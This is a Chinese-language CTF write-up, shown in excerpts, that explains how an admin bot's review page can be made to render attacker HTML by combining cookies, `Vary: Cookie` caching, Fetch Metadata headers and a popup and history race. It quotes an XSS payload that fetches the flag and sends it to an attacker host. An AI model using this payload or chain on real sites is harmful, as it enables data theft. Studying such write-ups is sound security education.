...
审查页 `/reports/check` 是本题最核心的路由（本文的"审查页"专指它；2.9 起出现的"审查界面"是另一个页面，即带沙箱 iframe 的审批页面 `/review`，两者不要混淆）。源码的流程由一条 `if (currentReview.visited)` 分成两段，下文分别称为**渲染分支**（条件成立时执行：渲染笔记原文）和**标记分支**（条件不成立时执行：标记已访问、下发 `view` cookie、返回占位页）。这两个名字是本文对两段代码的称呼，源码中并没有它们。完整源码如下（`src/server.js`，注释标出了每项检查对应的代码）：
...
用 curl 手工访问即可看到最容易观察的两项检查：`policy` 和 `state`。先取一个管理员会话模拟机器人视角：`curl -si http://localhost:3000/reports/session -H "X-Bot-Token: local-bot-token"`，把响应里的 `sid` cookie 记作 `$ADMIN_COOKIE`；rid/state 从容器日志里抄。然后依次发两个请求：
...
基本信息：值就是审查编号（源码 `res.cookie("view", id, ...)` 里的 `id`；`id` 与 `rid` 是同一个值，见 3.3）；只随 `/reports/check` 路径的请求发送。"发送"和"读取"是两个不同动作：它随请求被送到服务器（HTTP 机制决定的），但**真正读取并使用它的，是浏览器内部的缓存**（读取时机在请求发出之前，见机制二）；**服务器代码不读取它**（本地复现版的插桩日志会打印整个 Cookie 头原文，那也只是打印输出，不涉及读取逻辑）。它涉及两个机制，都关系到"第二次访问"能否顺利进行。
...
这行代码写在**标记分支**里，而标记分支只在**本轮审查的第一次** `/reports/check` 请求时执行（该请求进来时 `currentReview.visited` 还是 false；执行完它就被置为 true）。因此 `Set-Cookie` 只会出现在那一次的**响应里**，第二次及以后走渲染分支、不再执行这行。第一次请求（发起者是机器人访问审查页的那次请求，见 2.5 流程表第 5 行）的**响应头**里会出现这样一行：
...
之后每次发请求前，浏览器筛选要附带的 cookie ，筛选条件之一是比较请求路径与 cookie 的 `Path`：
...
先明确 HTTP 缓存是什么。它就是通常说的浏览器"网页缓存"（本文说的缓存都指浏览器自己的这一套；代理、CDN 上也有缓存，原理类似，本文不涉及）：

- **保存什么**：`GET` 请求的**响应**本身（状态码 + 响应头 + 响应体内容）；此外，条目还会带上判断复用所需的少量请求信息（请求方法、目标 URL、被 `Vary` 指名的请求头字段值），请求体和其他请求头不在其中。不限定内容类型（HTML 文档、CSS 文件、图片都算），也不限定发起者：页面跳转、`fetch`、图片/脚本加载等任何来源的 `GET` 请求，都进入同一套 HTTP 缓存体系；是否真的保存与复用，由响应头（`Cache-Control`、`Vary` 等）和浏览器实现共同决定。本题涉及的具体对象是 `/reports/check` 那条页面跳转请求的 HTML 响应。同一套规则也作用于 API：返回 JSON 的 `GET` 接口若带了允许缓存的响应头（如 `Cache-Control: max-age=300`），浏览器同样会缓存它，并在有效期内直接使用本地副本、不向服务器发请求，因此不希望被缓存的接口通常显式返回 `Cache-Control: no-store`。
- **怎么用**：之后浏览器再遇到请求时，先检查本地保存的记录；若判断"某份保存的响应可以使用"，就直接使用它、**不再发出网络请求**。判断条件由 HTTP 标准规定，其中一部分来自响应头（本题用到的是 `Vary: Cookie`，见下）。

**缓存条目过期后怎么办**

缓存条目有有效期（由 `Cache-Control` 等响应头决定）。有效期一过，浏览器有两种选择：直接重新下载整份响应；或者先问一句"我本地这份还能用吗"。选后者更省流量、更快。

问法是这样的：上一次响应里，服务器给内容生成过一个标识叫 `ETag`。常见做法是对内容算一个哈希（内容一样，标识就一样；内容变了，标识也变），也可以用内容的版本号或修改时间；本题预览页响应里的 `ETag: W/"2c4-..."` 就是 Express 框架自动算的。浏览器把它跟着缓存条目一起记了下来。条目过期后，浏览器把这个 `ETag` 放进请求头：`If-None-Match: <上次的 ETag>`，意思是"你那边这份内容还和我手上的一样吗"。

服务器收到后，拿它当前内容的 `ETag` 和请求里报的这个比对：

- 一样：内容没变，回 `304 Not Modified`（只带响应头，没有响应体）。浏览器就把本地那份接着用，并把有效期延后。
- 不一样：内容变了，回 `200`，把新内容完整发过来。

**为什么值得这么做**：比对 ETag 是服务器本地的一步（很便宜），这一步省下的是**整份响应体的网络传输**：`304` 只有几百字节的响应头，完整响应可能是几 KB 或更大。对客户端也一样：拿到 `304` 后不用重新下载、重新处理，直接接着用本地副本。

动态内容（API、服务端渲染的页面）的情况要单独说：服务器**照常执行**处理逻辑（查库/渲染），完成后对这次的响应体算 ETag（Express 对 `res.send`/`res.json`/`res.render` 默认就是这样，连"拿请求里的旧值比对、没变就返回 `304`"也由框架自动完成）；此时省的是响应体传输，查询/渲染的成本照付。若应用想连这步也省，可以先查一个轻量的版本信息（数据库行版本、文件时间戳），一致就直接回 `304`、跳过渲染，但这属于应用自己设计，框架不会自动做。静态资源的 ETag 则是预先或按文件元数据生成的，不涉及重新算。

**同一个 ETag 出现在哪两处**：服务器生成它时写在**响应头** `ETag` 里；浏览器下次做条件请求时把它放进**请求头** `If-None-Match` 捎回去。以本题预览页为例：
...
# 缓存过期后浏览器再请求：带着同一个标识核对
GET /note/c350151803f0f8f3d507 HTTP/1.1
If-None-Match: W/"2c4-vk0cnITZv6PybK/b0EOva9fTmFM"

# 服务器核对结果：
HTTP/1.1 304 Not Modified        （没变：无响应体）
# 或
HTTP/1.1 200 OK                  （变了：新内容 + 新 ETag）
```

把这个机制放到本题的两次访问上，按发生顺序走一遍。

**第一步：第一次访问的响应被保存时，缓存多记了一个字符串。**

第一次访问 `/reports/check` 的响应头里有两行关键内容（都来自服务器代码）：`Vary: Cookie`（源码 `res.setHeader("Vary", "Cookie")`）和 `Set-Cookie: view=8d7b1188...`（下发 cookie）。

`Vary: Cookie` 的含义可以拆成一句话：**服务器告诉缓存："以后想复用这条响应，除了 URL 要对得上，请求里的 `Cookie` 头也要和生成它时一模一样。"**

- 它写在**响应头**里（服务器发出的响应中）；
- 它的**值是请求头的名字**：写 `Cookie` 就比 `Cookie` 头；也可以写多个名字，例如 `Vary: Cookie, Accept-Language`。以 `Vary: Accept-Language` 为例：同一个 URL 的页面按请求语言返回中文版或英文版，缓存会按这个头把两个版本**分别存成两条**（`zh-CN` 一条、`en-US` 一条），谁来了就命中谁那份；不写 `Vary` 的话缓存只存一条，英文用户会拿到先被缓存的中文版页面；
- 比较的一方永远是**新请求的请求头**（"能不能复用"是拿新请求和存下的响应比）。

第一步里说的"多记了一个字符串"，就是**把第一次访问时请求里 `Cookie` 头的值，记进这条缓存条目**（具体以什么形式保存由浏览器实现决定，只要以后能拿新请求的同一个头的值分辨"是不是同一次"即可）。下面只画结构：URL 路径与字段名是真实的，**所有具体取值都是占位**：

```text
条目
├─ URL：/reports/check?rid=8d7b...&state=ff7a...
├─ 响应内容：占位页 HTML
└─ Cookie（被 Vary 指名的请求头）：<第一次访问时该头的值>    ← 值里只有会话 sid；view 要等这条响应里的 Set-Cookie 才被写入 cookie 存储，此刻请求里还没有它
```

**这份记录不是 cookie**。浏览器里 cookie 有自己独立的一套存储（cookie 存储）：`sid`、`view` 都住在那里，由响应里的 `Set-Cookie` 写入，之后每次发请求时由浏览器按规则自动附带。"发请求带哪些 cookie"由 cookie 存储决定，HTTP 缓存从不参与。缓存条目里记的，是**产生这条响应的那个请求**里 `Cookie` 头的值。上面这条缓存条目来自第一次访问的响应，所以记的就是第一次访问时请求里的值。这份记录并非一直停在第一次访问：缓存存入新响应时，新响应会配上生成它的请求的记录。它只是一份普通的字符串：浏览器不会把它当 cookie 解析，也不会发送它。这份记录进入条目的时刻，就是这条响应被存入缓存的同一刻（存响应时把生成它的请求头里、被 `Vary` 指名的字段值一并记下）。

**值里的 `sid=...` 是哪来的**：机器人登录那一步（2.5 流程表第 4 行），服务器为它新建会话，用响应头 `Set-Cookie: sid=...` 把新会话 ID 下发给浏览器（会话机制见 2.5）；浏览器收到后把这条 cookie 存进 cookie 存储。第一次访问 `/reports/check` 时，浏览器按 cookie 规则自动把 sid 放进该请求的 `Cookie` 头：机器人的浏览器上下文是全新的，此前只经历过登录这一步，所以该头里只有 sid 这一条。缓存在存下这条响应时，把这个请求头的值一并记进条目。也就是说：sid 的存储位置只有 cookie 存储一处，条目里的 `Cookie` 记录只是请求头值的留底；不存在"把 cookie 放进缓存"这个动作。

**为什么必须记它**：响应头 `Vary: Cookie` 指名了"这条响应的复用要以 `Cookie` 头为匹配条件"；HTTP 缓存规范（RFC 9111 第 4.1 节）要求：带 `Vary` 的存储响应，复用前必须拿新请求里被指名的那些请求头字段，与"当初产生这条响应的请求"（即第一次访问的请求）里的对应字段比对，全部相同才允许复用，否则不能直接使用。要比对，就必须把当时的值留在手边。所以"把 Cookie 写进缓存"是两个机制的共同作用：**服务器的 `Vary: Cookie` 提出匹配要求，缓存规范把"留底"定为复用的前提**。反过来：`Vary` 里不出现 `Cookie` 时，缓存里不会有这份记录（缓存不拿 `Cookie` 头做复用判断，就没有理由留它）。

**为什么第二次访问一定用不上这条缓存**：第一次访问的响应把 `Vary: Cookie` 和 `Set-Cookie: view=...` 放在了同一条响应里：前者要求"复用这条缓存时，按 `Cookie` 头的值比对"；后者给浏览器种下 `view`，使它随下一次 `/reports/check` 请求自动发送（机制一）。两件事合起来产生一个必然结果：**下一次请求的 `Cookie` 头必然与条目里记的值不同，这条缓存必然无法复用，请求必然发到服务器、由服务器实时处理**（具体比较见"第二步"）。本题要的正是这个结果：第二次访问只有落在服务器上，渲染分支才有机会执行。

**这里的"缓存"是谁**：谁存下了这条响应，谁就负责后面的存与比对。常见的是两种缓存：**浏览器缓存**（每台设备自己一份、只服务它自己，本文主线用的就是它）；**代理或 CDN 缓存**（多用户共用一份，网站前面挂了它们时，存与比对由它们完成）。本题的本地环境没有代理/CDN，所以从头到尾都是**机器人浏览器自己**在存和比。另外注意**谁能碰这个缓存**：它由**浏览器自己**管理。网页里的 JS **没有直接读写它的接口**（只能间接影响，比如用 `fetch` 的 `cache` 选项指示"这次请用/别用缓存"，但读不到也删不掉条目本身；网页能直接操作的 `caches` 是另一套独立的程序缓存，不是 HTTP 缓存）；**服务器**也读写不到它，只能用响应头（`Cache-Control`、`Vary` 等）提出"要求"。

**第二步：第二次访问时，缓存比较两个值，决定这条缓存能不能用。**

第二次请求发出前，缓存要回答"本地保存的占位页响应能不能直接使用"，检查分两级：

```text
① URL 比较：新请求 URL 与条目 URL 相同 → 通过
   （如果没有 Vary: Cookie，检查到此为止、允许直接复用这条缓存）
② Cookie 头的值比较（条目带 Vary: Cookie 才会做）：两个值是否完全相同：
     条目里记下的：  第一次访问时请求里 Cookie 头的值（只有 sid）
     新请求携带的：  第二次访问时请求里 Cookie 头的值（sid 之外还多了 view）
...
两个条件缺一不可：没有 `Vary: Cookie`，②不会发生（检查停在①，缓存被直接复用）；没有 `view`，②的比较结果会是"相同"（两次该头的值一样），缓存同样被复用。

> 同一 URL 下按不同条件分开缓存响应，缓存术语叫不同"变体"；`Vary: Cookie` 就是"按 `Cookie` 头分变体"。

最后澄清两种存储的分工（容易混）：cookie 存储管"以后发请求带不带、带什么"；缓存条目里的那份记录管"这条缓存能不能复用"，它只是产生这条响应的那个请求的 `Cookie` 头的值。`view` 只出现在 cookie 存储和实际发出的请求里：第二次访问的请求带着它，这正是上面②比较"不相同"的原因；它从来没有被写进这条缓存条目。两个机制本来互不相关，是服务器的 `Vary: Cookie` 这一行把 `Cookie` 头指定为缓存的匹配条件，两者才产生联系；缓存不解析 cookie 的含义（身份、会话等）。
...
目标：读取 `/api/flag` 的响应内容。攻击者直接请求必然失败，接口会校验是否存在管理员身份，而攻击者没有。所以目标改为："让笔记 HTML 在挑战域的审查页（`/reports/check`）的渲染分支里被渲染出来"（那是全站唯一不加防护的输出点）。

> 回顾一下笔记 HTML `<img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:9975/f?"+t)'>`，它里面能直接把 flag 发送到攻击者的网站。

渲染分支要过八项检查。把它当成一张待办清单，逐项分析自己能不能满足：

| # | 检查项 | 含义与来源 | 攻击者视角 |
|---|---|---|---|
| 1 | admin 会话 | 请求必须来自管理员会话：服务器查会话数据里的 `admin` 标记，不是管理员就 403。判定依据是请求自动携带的会话 cookie：机器人登录过（2.5.4），它发出的请求都带着这个 cookie，服务器凭它查到那份管理员会话 | 没有。攻击者无法自己成为管理员，只能借机器人浏览器发请求（弹窗、导航，2.9） |
| 2 | rid 匹配 | 请求网址里的 `rid` 必须等于本轮审查编号。编号由服务器在 `POST /report` 时随机生成（字段 `id`，定义见 3.3）；机器人打开提交网址时自动追加 `&rid=<编号>`，攻击者页面从自己的网址里读到它 | 知道。脚本从自己的网址（`location.search`）读到（2.9）；第二次访问的 URL 是历史重放，自带 rid（2.10） |
| 3 | 笔记存在 | 渲染时服务器要能取出对应笔记（`notes.get(noteId)`）；`noteId` 是 `POST /report` 时从提交网址的 `note=` 参数里提取的 | 自己控制：笔记（2.2 创建）和提交网址里的 `note=` 都由攻击者准备 |
| 4 | `policy` | 请求头必须同时为 `Sec-Fetch-Site: none` 和 `Sec-Fetch-Dest: document`。这组头由浏览器自动附加（Fetch Metadata 机制），网页脚本伪造不了 | 需要浏览器自己发起一次顶层导航：脚本发起的跳转/请求带不上 `none`（各自带别的值）；历史回退可以（2.10） |
| 5 | `state` 匹配 | 请求网址里的 `state` 必须等于服务器生成的 `nonce`（`POST /report` 提交审查网页时随机生成，见 3.3）。`nonce` 的使用在机器人第一次访问审查页的 URL 上（`/reports/check?rid=...&state=<nonce>`），通过 state 这个 URL 参数传递 | 不知道值，也不需要：第二次访问走历史回退，重放那条自带 `state` 的 URL（2.10） |
| 6 | `prepared` | 机器人已就位：机器人在打开提交网址前，服务器进程内部（不经浏览器）调用就绪接口 `/reports/arm/<编号>`（2.5.5 流程表第 7 行），置 `prepared=true` | 机器人自动完成，不用管 |
| 7 | `approved` | 审查已批准：需要有人真实调用一次 `/complete`，且 `id`、`prepared`、`admin`、`state` 四项全对才置位（3.2） | 初始 false。攻击者无法直接调用这个接口（跨站请求带不上管理员 cookie），做法是让审查界面自己调（2.9 的 pagehide 竞态） |
| 8 | `used` | 同一轮审查只能被渲染一次：服务器在渲染前把它置 true（防重复消费） | 初始 false，不是障碍：前七项都满足时，这次渲染就会成功并同时置位 |

> 请求头理解回顾：
> - `Sec-Fetch-Site: none`要求"无站点来源"：请求由浏览器 UI 直接发起（地址栏、书签、外部打开、回退/前进都属于这种；页面内点击的链接会带来源、不通过）
> - `Sec-Fetch-Dest: document`： 要求目标是"加载文档"且是顶层导航请求；iframe 里打开网页的取值是 iframe（图片/脚本/fetch 等子资源各有其值），都不满足这一条
> - 两者结合意味着：请求没有页面来源（none 的原义）、且目标是顶层文档导航（通过地址栏、书签、外部应用打开、手动或JS操作的回退/前进都属于这类）

由此得到四个必须解决的问题：

1. **注入问题**：怎么让自己的脚本进入机器人浏览器并打开审查界面（第 1 项），详见节 2.5、2.9：分两步，先提交 stage1 让脚本进入机器人浏览器，再借机器人身份打开审查界面。
2. **批准问题**：怎么让审查界面调用 `/complete`（第 7 项），详见节 2.9。
3. **时机问题**：怎么发起"第二次访问"，让机器人历史里那条审查页 URL（自带正确的 rid/state）被重新真实请求一次（第 2、4、5 项），详见节 2.10。
4. **外传问题**：渲染出的 XSS 怎么把 flag 带走（第 3 项，攻击者提交笔记的时候已经提交了带有攻击能力的 HTML 代码），详见节 2.11。


### 2.9 批准：弹窗与 pagehide 竞态

2.5 停在这里：机器人打开了 stage1（该轮日志的最后一行），并开始 10 秒停留。

- stage1 页面里的第一段 JS 立即执行（就是 2.5.2 里 attacker.js 的 `/stage1` 路由拼出的页面）：弹窗打开审查界面（`/review`）。
- 第二段 3.5 秒后才开始：先连续自导航把首访审查页挤出浏览器的前进后退缓存，再历史回退让那条审查页 URL 被真实重新请求一次（2.10 详讲）。

> 本节按顺序：弹窗 → 沙箱加载 → pagehide 竞态 → `/complete`。

先说清为什么弹窗是关键：stage1 运行在攻击者的源（例如 `http://host.docker.internal:9975`），**不是挑战域**。它直接调用 `fetch("http://localhost:3000/api/flag")`时，由于是跨站所以无法带上 `SameSite=Lax` 的 cookie，服务器会返回 403，意味着没有权限；直接 `fetch` 审查界面也不行（同类问题）。

> 注意 `/api/flag` 源码里没有 cookie 字样：403 是 `!req.session.admin` 为真触发的（条件里另一半 `!currentReview` 与 cookie 无关）。`req.session` 不是请求自带的字段，而是会话中间件加出来的：读请求里的 `sid` cookie、查会话存储、挂 `req.session` 这三步都发生在进入路由之前，实现在 `express-session` 库的代码里（题目源码只用 `app.use(session({...}))` 注册它，机制见 2.5.4）。跨站 `fetch` 带不上 cookie，拿到的就是没有 `admin` 的空会话。
...
审查界面打开后，其中的沙箱 iframe（带 `sandbox` 属性限制的嵌入子页面：允许执行脚本，但不给它任何同源权限）会加载 `/sandbox?rid=...`，服务器用带 nonce 的 script 标签加载攻击脚本。至此，攻击脚本在审查界面内部的沙箱 iframe 里开始运行。
